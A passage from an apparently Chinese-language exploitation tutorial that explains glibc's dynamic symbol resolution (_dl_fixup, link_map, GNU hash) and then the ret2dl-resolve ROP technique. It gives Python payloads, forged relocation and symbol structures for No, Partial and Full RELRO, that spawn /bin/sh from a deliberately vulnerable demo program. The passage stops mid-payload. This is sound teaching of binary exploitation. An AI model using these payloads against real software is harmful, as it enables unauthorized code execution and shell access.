中的第二条指令（<code>XX@plt+6</code>）；第二条指令 <code>PUSH reloc_arg</code>（如果用 <code>.rel.plt</code> 则 <code>reloc_arg</code> 是 <code>offset</code>；如果是 <code>rela.plt.</code> 则是 <code>index</code>）；第三条指令 JMP 至 PLT 中的第一行（<code>PLT0</code>）。</p><p>接下来在 <code>PLT0</code> 中，第一条指令 <code>PUSH GOT1</code> 把 <code>link_map</code> 结构体入栈（64 位在调用 <code>_dl_fixup()</code> 之前会把栈上的 <code>link_map</code> 和 <code>reloc_arg</code> 分别复制给 rdi 和 rsi）；第二条指令 <code>JMP GOT2</code> 来跳转到 Dynamic Resolver 来寻找 Symbol（即跳转到 <code>_dl_runtime_resolve()</code>）</p><h3 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve()"></a><code>_dl_runtime_resolve()</code></h3><p><code>_dl_runtime_resolve()</code> 函数是 Symbol 的解析器，它将 <code>link_map</code> 和 <code>reloc_arg</code> 作为参数传入 <code>_dl_fixup()</code>，并在 <code>_dl_fixup()</code> 中获取 Symbol Name，在 Library 中找到对应的地址并填入 GOT。解析成功后，程序会直接跳转到解出的函数地址。</p><p>Resolver 先根据 reloc_arg 定位到 <code>.rel.plt</code>（<code>.rela.plt</code>），然后根据 <code>r_info</code> 找到对应的 Symbol Name，并获取在 Library 中的地址，然后根据 <code>r_offset</code> 找到 GOT，并将获得的地址填入 GOT。查找函数的过程如下：</p><pre><code>_dl_runtime_resolve(link_map, reloc_arg)            __________            |           |Elf64_Rela| &lt;---------+           |----------|      +--- | r_offset |         ___________      |    |  r_info  | -----&gt; | Elf64_Sym |          ____________      |    |__________|        |-----------|         |            |      |                        |  st_name  | ------&gt; | printf\x00 |      |      .rel.plt          |___________|         |____________|      v  __________                     .dynsym                .dynstr |          | | &lt;printf&gt; | |__________|   .got.plt</code></pre><p>其中 <code>link_map</code> 中包括了所有已加载的 ELF 信息。</p><h4 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a><code>link_map</code></h4><p><code>link_map</code> 结构体在 <a href="https://code.woboq.org/userspace/glibc/include/link.h.html" target="_blank" rel="noopener"><code>glibc/include/link.h</code></a> 中实现。其中，<code>l_next</code> 作为指针连接所有载入的 Library；<code>l_name</code> 存储了 Library 的名字；<code>l_addr</code> 中存储了该 Library 的基址；<code>l_info[x]</code> 则指向 <code>.dynamic</code> 中的数据，<code>x</code> 即为 <code>d_tag</code>，可以用来获取 Library 中的指定 Section：</p><pre><code class="cpp">/* Structure describing a loaded shared object.  The `l_next&#39; and `l_prev&#39;   members form a chain of all the shared objects loaded at startup.   These data structures exist in space used by the run-time dynamic linker;   modifying them may have disastrous results.   This data structure might change in future, if necessary.  User-level   programs must avoid defining objects of this type.  */struct link_map  {    /* These first few members are part of the protocol with the debugger.       This is the same format used in SVR4.  */    ElfW(Addr) l_addr;                /* Difference between the address in the ELF                                   file and the addresses in memory.  */    char *l_name;                /* Absolute file name object was found in.  */    ElfW(Dyn) *l_ld;                /* Dynamic section of the shared object.  */    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */    /* All following members are internal to the dynamic linker.       They may change without notice.  */    /* This is an element which is only ever different from a pointer to       the very same copy of this type for ld.so when it is used in more       than one namespace.  */    struct link_map *l_real;    /* Number of the namespace this link map belongs to.  */    Lmid_t l_ns;    struct libname_list *l_libname;    /* Indexed pointers to dynamic section.       [0,DT_NUM) are indexed by the processor-independent tags.       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are       indexed by DT_VERSIONTAGIDX(tagvalue).       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by       DT_EXTRATAGIDX(tagvalue).       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are       indexed by DT_VALTAGIDX(tagvalue) and       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];    const ElfW(Phdr) *l_phdr;        /* Pointer to program header table in core.  */    ElfW(Addr) l_entry;                /* Entry point location.  */    ElfW(Half) l_phnum;                /* Number of program header entries.  */    ElfW(Half) l_ldnum;                /* Number of dynamic segment entries.  */    ...    /* Pointer to the version information if available.  */    ElfW(Versym) *l_versyms;    ...  };</code></pre><h4 id="dl-fixup"><a href="#dl-fixup" class="headerlink" title="_dl_fixup()"></a><code>_dl_fixup()</code></h4><p><code>_dl_fixup()</code> 在 <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html" target="_blank" rel="noopener">dl-runtime.c</a> 中实现。通过 <code>reloc_arg</code> 在 <code>link_map</code> 中获取相应的 <code>symtab</code>（<code>.dynsym</code> 数组）、<code>strtab</code>（<code>.dynstr</code>）、<code>reloc</code>（<code>.rel.plt</code> 或 <code>.rela.plt</code>）、<code>sym</code>（根据 <code>reloc</code> 中的 <code>r_info</code> 得到对应的 <code>.dynsym</code> 元素）。然后会有一系列的检查，通过检查后根据 <code>strtab + sym-&gt;st_name</code> 的 Symbol Name 查找到对应的地址，最后填入 GOT：</p><pre><code class="cpp">/* This function is called through a special trampoline from the PLT the   first time each PLT entry is called.  We must perform the relocation   specified in the PLT of the given shared object, and return the resolved   function address to the trampoline, which will restart the original call   to that address.  Future calls will bounce directly from the PLT to the   function.  */DL_FIXUP_VALUE_TYPE__attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS       ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif       struct link_map *l, ElfW(Word) reloc_arg){  const ElfW(Sym) *const symtab    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);  // 通过reloc_arg计算重定位入口，JMPREL即.rel.plt，reloc_offset在32位下为reloc_arg（64位下为reloc_arg * sizeof (PLTREL)）  const PLTREL *const reloc    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  // 通过reloc-&gt;r_info找到.dynsym中对应的部分  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  // 检查reloc-&gt;r_info的最低位是不是ELF_MACHINE_JMP_SLOT（7，表示这是一个PLT）  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);  // 检查version  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)    {      const struct r_found_version *version = NULL;      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)    {      const ElfW(Half) *vernum =        (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;      version = &amp;l-&gt;l_versions[ndx];      if (version-&gt;hash == 0)        version = NULL;    }      /* We need to keep the scope around so do some locking.  This is     not necessary for objects which cannot be unloaded or when     we are not using any threads (yet).  */      int flags = DL_LOOKUP_ADD_DEPENDENCY;      if (!RTLD_SINGLE_THREAD_P)    {      THREAD_GSCOPE_SET_FLAG ();      flags |= DL_LOOKUP_GSCOPE_LOCK;    }#ifdef RTLD_ENABLE_FOREIGN_CALL      RTLD_ENABLE_FOREIGN_CALL;#endif      // 通过strtab + sym-&gt;st_name找到符号表字符串，result为libc基地址      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);      /* We are done with the global scope.  */      if (!RTLD_SINGLE_THREAD_P)    THREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL      RTLD_FINALIZE_FOREIGN_CALL;#endif      // 找到了对应的.dynsym后，Library基址加上st_value的结果即为函数地址      value = DL_FIXUP_MAKE_VALUE (result,                   sym ? (LOOKUP_VALUE_ADDRESS (result)                      + sym-&gt;st_value) : 0);    }  else    {      // 如果Symbol已经找到了      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);      result = l;    }  // value为libc基址加上要解析函数的偏移地址，即实际地址  value = elf_machine_plt_value (l, reloc, value);  if (sym != NULL      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  /* Finally, fix up the plt itself.  */  if (__builtin_expect (GLRO(dl_bind_not), 0))    return value;  // 把value写入对应的GOT中  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);}</code></pre><h5 id="dl-lookup-symbol-x-（-dl-lookup-x-）"><a href="#dl-lookup-symbol-x-（-dl-lookup-x-）" class="headerlink" title="_dl_lookup_symbol_x()（_dl_lookup_x()）"></a><code>_dl_lookup_symbol_x()</code>（<code>_dl_lookup_x()</code>）</h5><p><code>_dl_lookup_symbol_x()</code> 以及 <code>_dl_lookup_x()</code> 在 <a href="https://code.woboq.org/userspace/glibc/elf/dl-lookup.c.html" target="_blank" rel="noopener"><code>glibc/elf/dl-look-up.c</code></a> 中实现。其中根据 <code>strtab + sym-&gt;st_name</code> 来查找符号表。理论上可以通过遍历 <code>.dynsym</code> 中的每个元素的 <code>st_name</code> 来获取 <code>.dynstr</code> 中对应的字符串，并和传入的 Symbol Name 进行比较，但这样的时间复杂度就会很高。<code>_dl_lookup_symbol_x()</code> 中则通过哈希表（GNU Hash）来进行查找：</p><pre><code class="cpp">static uint_fast32_tdl_new_hash (const char *s){  uint_fast32_t h = 5381;  for (unsigned char c = *s; c != &#39;\0&#39;; c = *++s)    h = h * 33 + c;  return h &amp; 0xffffffff;}</code></pre><p>可以用 Python 实现这个函数：</p><pre><code class="python">In [1]: def dl_new_hash(s):   ...:   h = 5381   ...:   for c in s:   ...:     h = 33 * h + ord(c)   ...:   return h &amp; 0xffffffff   ...:In [2]: hex(dl_new_hash(&#39;__isoc99_scanf&#39;))Out[2]: &#39;0xeafe348dL&#39;</code></pre><p><code>_dl_lookup_symbol_x()</code> 中，先会调用 <code>dl_new_hash()</code> 来计算 Symbol Name 的哈希值，然后调用 <code>do_lookup_x()</code> 来查找对应的 Symbol：</p><pre><code class="cpp">/* Search loaded objects&#39; symbol tables for a definition of the symbol   UNDEF_NAME, perhaps with a requested version for the symbol.   We must never have calls to the audit functions inside this function   or in any function which gets called.  If this would happen the audit   code might create a thread which can throw off all the scope locking.  */lookup_tinternal_function_dl_lookup_symbol_x (const char *undef_name, struct link_map *undef_map,             const ElfW(Sym) **ref,             struct r_scope_elem *symbol_scope[],             const struct r_found_version *version,             int type_class, int flags, struct link_map *skip_map){  const uint_fast32_t new_hash = dl_new_hash (undef_name); // 获取Symbol Name的哈希  unsigned long int old_hash = 0xffffffff;  struct sym_val current_value = { NULL, NULL };  struct r_scope_elem **scope = symbol_scope;  ...  /* Search the relevant loaded objects for a definition.  */  for (size_t start = i; *scope != NULL; start = 0, ++scope)    {      int res = do_lookup_x (undef_name, new_hash, &amp;old_hash, *ref,                 &amp;current_value, *scope, start, version, flags,                 skip_map, type_class, undef_map);      if (res &gt; 0)    break;  ...  *ref = current_value.s;  return LOOKUP_VALUE (current_value.m);}</code></pre><p>在 <code>do_lookup_x()</code> 中有一个大循环，主要是根据 Symbol Name 的哈希值模 <code>l_nbuckets</code> 作为下标，从 <code>l_gnu_buckets</code> 中获取一个 <code>bucket</code>。然后根据 bucket 从 <code>l_gnu_chain_zero</code> 取出一个哈希值来进行比较，如果正确，那么当前的 <code>bucket</code> 的值就是目标 <code>.dynsym</code> 的下标；如果不正确，将 <code>bucket</code> 的值加 1。最后返回 Symbol Name 对应的 <code>.dynsym</code>：</p><pre><code class="cpp">/* Inner part of the lookup functions.  We return a value &gt; 0 if we   found the symbol, the value 0 if nothing is found and &lt; 0 if   something bad happened.  */static int__attribute_noinline__do_lookup_x (const char *undef_name, uint_fast32_t new_hash,         unsigned long int *old_hash, const ElfW(Sym) *ref,         struct sym_val *result, struct r_scope_elem *scope, size_t i,         const struct r_found_version *const version, int flags,         struct link_map *skip, int type_class, struct link_map *undef_map){  size_t n = scope-&gt;r_nlist;  /* Make sure we read the value before proceeding.  Otherwise we     might use r_list pointing to the initial scope and r_nlist being     the value after a resize.  That is the only path in dl-open.c not     protected by GSCOPE.  A read barrier here might be to expensive.  */  __asm volatile (&quot;&quot; : &quot;+r&quot; (n), &quot;+m&quot; (scope-&gt;r_list));  struct link_map **list = scope-&gt;r_list;  do    {  ...      /* The tables for this map.  */      const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]);      const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]);  ...      if (__builtin_expect (bitmask != NULL, 1))    {      ElfW(Addr) bitmask_word        = bitmask[(new_hash / __ELF_NATIVE_CLASS)              &amp; map-&gt;l_gnu_bitmask_idxbits];      unsigned int hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - 1);      unsigned int hashbit2 = ((new_hash &gt;&gt; map-&gt;l_gnu_shift)                   &amp; (__ELF_NATIVE_CLASS - 1));      if (__builtin_expect ((bitmask_word &gt;&gt; hashbit1)                &amp; (bitmask_word &gt;&gt; hashbit2) &amp; 1, 0))        {        // 从l_gnu_buckets中获取一个bucket          Elf32_Word bucket = map-&gt;l_gnu_buckets[new_hash                             % map-&gt;l_nbuckets];          if (bucket != 0)        {      // 从l_gnu_chain_zero取出一个哈希值          const Elf32_Word *hasharr = &amp;map-&gt;l_gnu_chain_zero[bucket];          do            if (((*hasharr ^ new_hash) &gt;&gt; 1) == 0) // 比较哈希值              {            symidx = hasharr - map-&gt;l_gnu_chain_zero;            sym = check_match (&amp;symtab[symidx]);            if (sym != NULL)              goto found_it;              }          while ((*hasharr++ &amp; 1u) == 0);        }        }      /* No symbol found.  */      symidx = SHN_UNDEF;    }  ...    }  /* We have not found anything until now.  */  return 0;}</code></pre><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>根据上面的分析，基本上可以得出 Dynamic Resolver 进行解析 Symbol 的过程：</p><ul><li>根据 <code>reloc_arg</code> 加载 Symbol Name</li><li>根据 <code>link_map</code> 中依次在每个 Library 中找 Symbol</li><li>计算 Symbol 的 Hash</li><li>用 Bloom Filter 检查 Symbol 是否存在（不是很重要）</li><li>在 Hash Bucket 和 Chain 中找 Symbol，若 <code>st_name</code> 符合则找到</li><li>检查 <code>version</code> 是否正确（不太重要）</li><li>填写 GOT 并回传 Symbol 的地址</li></ul><p>而 DynELF 的功能其实就是在干 Dynamic Resolver 的工作，它没有采用 GNU Hash 的方法来查找，而是使用了一个一个找 <code>.dynsym</code> 的方式来定位想要的函数。</p><h1 id="Return-to-Dynamic-Resolver"><a href="#Return-to-Dynamic-Resolver" class="headerlink" title="Return to Dynamic Resolver"></a>Return to Dynamic Resolver</h1><p>一种根据 Dynamic Resolver 的工作原理来实现的 ROP 技术。通过构造传给 <code>_dl_runtime_resolve</code> 的参数，让 <code>_dl_fixup</code> 解析出我们要的 Symbol：</p><ul><li>参数通过栈传递，x86 和 x64 都可以使用</li><li>可以直接 CALL PLT0，这样就只需要传 <code>reloc_arg</code></li><li>需要控制 <code>link_map</code> 的时候可以 JMP PLT0 的第二条指令</li><li>不需要泄漏信息和 libc 版本，百分之百稳定 get shell</li></ul><h2 id="What-is-RELRO"><a href="#What-is-RELRO" class="headerlink" title="What is RELRO"></a>What is RELRO</h2><p>Relocation Read Only（RELRO）保护有不同等级，利用的方法和复杂程度不同：</p><ul><li>No RELRO：所有相关的数据部分都能写</li><li>Partial RELRO（gcc 默认设定的值）：<code>.dynamic</code>、<code>.dynsym</code>、<code>.dynstr</code> 等部分只读</li><li>Full RELRO：所有的 Symbol 在加载时都解析完成，GOT 只读，没有 <code>link_map</code> 和 Dynamic Resolver 的指针可以利用</li></ul><p>下面根据三种情况分析不同的攻击方法。程序源码如下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;char buf[1000000];int main() {    char local[10];//    write(1, &quot;&gt; &quot;, 2); // 32位下可以在没有泄漏的情况下实现，64位下可能需要泄漏    int len = read(0, buf, sizeof(buf));    memcpy(local, buf, len);    return 0;}</code></pre><h2 id="No-RELRO"><a href="#No-RELRO" class="headerlink" title="No RELRO"></a>No RELRO</h2><p>直接伪造 <code>.dynstr</code>，通过 <code>readelf</code> 找到 <code>.dynamic</code> 中 <code>DT_STRTAB</code> 的位置，把原本的 <code>.dynstr</code> 指向可控制的内存（在上面放 <code>&quot;system\x00&quot;</code>），然后跳到一个还没有解析过的 Symbol 上，如 <code>__gmon_start__</code>。这种方法只能在 No RELRO 的情况下使用。32 位下可以构造如下 payload：</p><pre><code class="python">def memcpy(dst, src, length):    return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)st_name = 0x38payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(dynstr_addr + 4, buf + 2048, 4) +        p32(gmon_start_plt) +        p32(0xdeadbeef) +        p32(buf + 2048 + 12) # &amp;&quot;/bin/sh\x00&quot;    ).ljust(2048, &#39;\x00&#39;) +  # buf+2048    p32(buf + 2048 + 4 - st_name) + # set strtab=&amp;&quot;system\x00&quot;    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>64 位下同理：</p><pre><code class="python">def csu(func, rdi, rsi, rdx):  payload = (        p64(0x40066a) + p64(0) + p64(1) + p64(func) + p64(rdx) + p64(rsi) + p64(rdi) +        p64(0x400650) + 56 * &#39;\x00&#39;  )  return payloaddef memcpy(dst, src, length):    return csu(memcpy_got, dst, src, length)payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(dynstr_addr + 8, buf + 2048, 8) +        p64(pop_rdi_ret) +        p64(buf + 2048 + 16) +        p64(gmon_start_plt)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    p64(buf + 2048 + 8 - st_name) + # set strtab=&amp;&quot;system\x00&quot;    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><h2 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h2><p>构造一个假的 <code>Elf32_Rel</code>（<code>Elf64_Rela</code>），使 <code>r_offset</code> 在可写位置，<code>r_info</code> 使 <code>&amp;.dynsym[r_info&gt;&gt;8]</code>（64 位下是 <code>&amp;.dynsym[r_info&gt;&gt;32]</code>）可控。然后传一个特别大的 <code>reloc_arg</code> 进去，使 <code>.rel.plt+reloc_arg</code> 落在假的 <code>Elf32_Rel</code>（<code>Elf64_Rela</code>）上。接着构造一个假的 <code>Elf32_Sym</code>（<code>Elf64_Sym</code>），其中构造 <code>st_name</code> 使 <code>.dynstr+st_name</code> 可控（放上 <code>&quot;system\x00&quot;</code>）</p><p>如果可控的内存地址和 Section 相反或距离太远而无法使用（基本上 64 位会有这个问题），需要让 <code>reloc_arg</code>、<code>r_info</code>、<code>st_name</code> 的参数可以放进这块内存。其中 <code>.gnu.version[r_info&gt;&gt;8]</code> 要为 0，或者把 <code>l_info[VERSYMIDX (DT_VERSYM)]</code> 中的内容清空。由于我们构造的伪 Symbol 中的 <code>r_info</code> 过大，使得 <code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code> 读取出错，如果 <code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code> 的值为 NULL 就不会出错，如下：</p><pre><code class="cpp">      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)        {          const ElfW(Half) *vernum =            (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;          version = &amp;l-&gt;l_versions[ndx];          if (version-&gt;hash == 0)            version = NULL;        }</code></pre><p>32 位下可以构造如下 payload：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        p32(plt0) +        p32(buf + 2048 - relplt) + # set reloc_arg=buf+2048        p32(0xdeadbeef) +        p32(buf + 2048 + 36)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    # Elf32_Rel    p32(buf) + # r_offset    p32(0x7 | (((buf + 2048 + 8 + 4 - dynsym) / 16) &lt;&lt; 8)) + # r_info    p32(0) + # padding    # Elf32_Sym &lt;= buf+2048+12    p32(buf + 2048 + 28 - dynstr) + # st_name    p32(0) + # st_value    p32(0) + # st_size    p32(0x12) + # st_info    # buf+2048+28    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>64 位有一些地方不太一样，比如说结构体的大小等，其中 <code>reloc_arg</code> 的宏定义也和 32 位不同，上文也提到了。不过 <code>Elf64_Sym</code> 结构体的大小还是跟 32 位下的 <code>Elf32_Sym</code> 一样，只是几个变量的顺序有所改变，需要修改。同时，64 位下会产生上面提到的 Segmentation Fault。由于 64 位的 Function Call 用的是 <code>__libc_csu_init</code> 中的通用 Gadget，设置第一个参数 rdi 时只能传低 32 位，所以导致不能直接 <code>memcpy</code> 到 <code>link_map</code> 上来改 <code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>，所以借助了 <code>read</code> 和 <code>write</code> 来实现：</p><pre><code class="python">reloc_arg = (buf + 2048 + 16 - relplt) / 24payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120        write(1, 0, 0x1c8+8) + # buf+1024+240        memcpy(buf + 1024 + 400, got1, 8) + # buf+1024+360        read(0, 0, 0x1c8+8) + # buf+1024+480 ; l-&gt;l_info[VERSYMIDX (DT_VERSYM)]=NULL        p64(pop_rdi_ret) +        p64(buf + 2048 + 56) +        p64(plt0) +        p64(reloc_arg) # set reloc_arg    ).ljust(2048, &#39;\x00&#39;) +  # buf+2048    16 * &#39;\x00&#39; + # padding    # Elf64_Rela    p64(buf) + # r_offset    p64(0x7 | (((buf + 2048 + 32 - dynsym) / 24) &lt;&lt; 32)) + # r_info    # Elf64_Sym &lt;= buf+2048+32    p32(buf + 2048 + 48 - dynstr) + # st_name    p32(0x12) + # st_info    p32(0) +    p32(0) +    # buf+2048+48    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>Partial RELRO 的第二种方法是直接修改 <code>link_map</code>，将 <code>l_info[DT_STRTAB]</code> 指向构造出来的 <code>Elf32_Dyn</code>（<code>Elf64_Dyn</code>）来伪造 <code>.dynstr</code>。然后呼叫 <code>__gmon_start__</code> 并在对应 <code>st_name</code> 的地址处放上 <code>&quot;system\x00&quot;</code>。不过需要有特定的 Gadget 才有办法在不能泄漏的情况下使 <code>*(*(pointer)+offset)=value</code>。32 位下构造如下 payload：</p><pre><code class="python">def memcpy(dst, src, length):    return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 32, got1, 4) + # buf+1024+20        memcpy(buf, 0, 56) + # buf+1024+40        memcpy(buf + 52, buf + 2048, 4) + # buf+1024+60        memcpy(buf + 1024 + 88, got1, 4) + # buf+1024+80        memcpy(0, buf, 56) + # buf+1024+100        p32(gmon_start_plt) + p32(0xdeadbeef) + p32(buf + 2048 + 20)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    p32(buf + 2048 + 4) +    p32(5) +    p32(buf + 2048 + 12 - st_name) +    # buf+2048+12    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>64 位下对 <code>link_map</code> 的修改同样借助了泄漏来实现：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120        memcpy(buf, 0, 112) + # buf+1024+240        memcpy(buf + 104, buf + 2048, 8) + # buf+1024+360        write(1, buf, 112) + # buf+1024+480        memcpy(buf + 1024 + 640, got1, 8) + # buf+1024+600        read(0, 0, 112) + # buf+1024+720        p64(pop_rdi_ret) +        p64(buf + 2048 + 32) +        p64(gmon_start_plt)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    p64(buf + 2048 + 8) +    p64(5) +    p64(buf + 2048 + 24 - st_name) +    # data+24    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><h2 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h2><p>GOT1 和 GOT2 在 Full RELRO 时被置为了 0，所以重点在于如何找回 <code>link_map</code> 和 Dynamic Resolver：</p><ul><li>找回 <code>link_map</code>：<code>.dynamic</code> 中 <code>DT_BUG</code> 指向 <code>r_debug</code> 结构，<code>r_debug</code> 中 <code>r_map</code> 指向 <code>link_map</code>；</li><li>找回 Dynamic Resolver：用 <code>l_next</code> 找下一个 Library，然后用 <code>l_info[DT_PLTGOT]</code> 找出 Library 的 <code>.got.plt</code> 地址（因为大部分 Library 都不是 Full RELRO，它们对应的 GOT2 就是 <code>_dl_runtime_resolve</code>）。</li></ul><p>以 32 位的程序为例，下面是 <code>link_map</code> 和 <code>_dl_runtime_resolve</code> 的查找过程：</p><pre><code class="gdb">(gdb) p/x *(Elf32_Dyn *)(0x08049ee8+12*8)$1 = {  d_tag = 0x15,  d_un = {    d_val = 0xf7ffd928,    d_ptr = 0xf7ffd928  }}(gdb) p/x *(struct r_debug *)0xf7ffd928$2 = {  r_version = 0x1,  r_map = 0xf7ffd940,  r_brk = 0xf7febae8,  r_state = 0x0,  r_ldbase = 0xf7fdd000}(gdb) p/x *(struct link_map *)0xf7ffd940$3 = {  l_addr = 0x0,  l_name = 0xf7ffdc2c,  l_ld = 0x8049ee8,  l_next = 0xf7ffdc30,  l_prev = 0x0,  l_real = 0xf7ffd940,  l_ns = 0x0,  l_libname = 0xf7ffdc20,  l_info = {0x0, 0x8049ee8, 0x8049f58, 0x8049f50, 0x0, 0x8049f28, 0x8049f30, 0x0, 0x0, 0x0, 0x8049f38, 0x8049f40, 0x8049ef0, 0x8049ef8, 0x0, 0x0, 0x0,    0x8049f70, 0x8049f78, 0x8049f80, 0x8049f60, 0x8049f48, 0x0, 0x8049f68, 0x8049f90, 0x8049f00, 0x8049f10, 0x8049f08, 0x8049f18, 0x0, 0x0, 0x0, 0x0, 0x0,    0x8049fa0, 0x8049f98, 0x0, 0x0, 0x8049f90, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fa8, 0x0 &lt;repeats 25 times&gt;, 0x8049f20},  l_phdr = 0x8048034,  l_entry = 0x8048350,  l_phnum = 0x9,  l_ldnum = 0x0,  ...(gdb) p/x ((struct link_map *)0xf7ffd940)-&gt;l_next-&gt;l_info[3]$4 = 0x0(gdb) p/x ((struct link_map *)0xf7ffd940)-&gt;l_next-&gt;l_next-&gt;l_info[3]$5 = 0xf7fd2de0(gdb) p/x *(Elf32_Dyn *)0xf7fd2de0$6 = {  d_tag = 0x3,  d_un = {    d_val = 0xf7fd3000,    d_ptr = 0xf7fd3000  }}(gdb) x/3wx 0xf7fd30000xf7fd3000:    0x0019bd88    0xf7fd7770    0xf7ff04e0(gdb) x/i 0xf7ff04e0   0xf7ff04e0 &lt;_dl_runtime_resolve&gt;:    push   eax</code></pre><p>32 位下的构造如下：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 32, r_debug_addr, 4) + # buf+1024+20        memcpy(buf, 0, 8) + # buf+1024+40 ; link_map=buf+4        memcpy(buf + 1024 + 72, link_map_addr, 4) + # buf+1024+60        memcpy(buf + 8, 0, 16) + # buf+1024+80 ; link_map-&gt;l_next=buf+20        memcpy(buf + 1024 + 112, buf + 20, 4) + # buf+1024+100        memcpy(buf + 8, 0, 16) + # buf+1024+120 ; link_map-&gt;l_next-&gt;l_next=buf+20        memcpy(buf + 1024 + 152, buf + 20, 4) + # buf+1024+140        